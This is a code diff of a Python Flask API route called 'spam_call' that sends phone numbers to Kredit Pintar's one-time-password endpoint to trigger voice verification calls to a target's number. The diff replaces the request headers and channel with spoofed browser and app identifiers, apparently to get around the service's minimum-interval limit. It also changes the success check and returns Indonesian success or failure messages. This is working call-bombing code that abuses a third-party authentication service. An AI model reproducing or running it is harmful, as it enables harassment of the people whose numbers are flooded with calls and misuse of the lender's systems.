@@ -1510,20 +1510,21 @@ def spam_call():
         return jsonify({"error": "Invalid or expired API key, plese download new apikey"}), 401
 	
     # Verifikasi kunci API
+    head_kredit={'Host':'h.kreditpintar.com','content-length':'49','x-user-agent':'Pintar-ID-Cash (WebAndroid;;;id) uuid/7cbf669f-12e2-48a3-9e87-087a89d00f9d version/0.1.0','x-app-version':'APPVERSION_NAME(9999)','accept-language':'id','sec-ch-ua-mobile':'?1','x-adv-uuid':'7cbf669f-12e2-48a3-9e87-087a89d00f9d','user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:48.0) Gecko/20100101 Firefox/48.0','content-type':'application/json','accept':'application/json, text/plain, */*','x-os-type':'WEB','sec-ch-ua-platform':'"Android"','origin':'https://h.kreditpintar.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':f'https://h.kreditpintar.com/H5/code-step?m=0{nomor}','accept-encoding':'gzip, deflate, br, zstd',}
+    json_kredit=json.dumps({"mobileNumber":f"+620{nomor}","type":"VOICE"})
+    response = requests.post("https://h.kreditpintar.com/api/auth/send-code?channel=H5&lang=id",headers=head_kredit, data=json_kredit).text
 
-    response = requests.post("https://h.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id", headers={'Host': 'h.kreditpintar.com', 'Connection': 'keep-alive', 'Content-Length': '47', 'x-adv-market-channel': 'OfficialWebsite', 'x-user-agent': 'Pintar-ID-Cash (WebAndroid;;;id) uuid/23634849-9a8a-48c0-95b7-53ab7359f94a version/0.1.0', 'DNT': '1', 'x-app-version': 'APPVERSION_NAME(9999)', 'Accept-Language': 'id', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Windows NT 6.2; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'x-os-type': 'WEB', 'sentry-trace': '1b9dd6373f7b47e4a21e9003d9d3580d-969ddbf191b89d53-1', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://h.kreditpintar.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://h.kreditpintar.com/OFFICIAL2021/code-step?m='+nomor}, data=json.dumps({"mobileNumber": "+62"+nomor, "type": "VOICE"})).text
-    
-    if 'OTP_MIN_INTERVAL_LIMIT' in response:
-        return jsonify({
-            "creator": "AmmarBN",
-            "response": "Failed",
-            "message": f"Gagal Mengirim Call ke {nomor}"
-        })
-    else:
+    if 'batchNo' in response:
         return jsonify({
             "response": "success",
             "message": f"Berhasil Mengirim Call Ke {nomor}",
             "creator": "AmmarBN"
+        })
+    else:
+        return jsonify({
+            "creator": "AmmarBN",
+            "response": "Failed",
+            "message": f"Gagal Mengirim Call ke {nomor}"
         })
 
 @app.route('/api/openai', methods=['GET'])
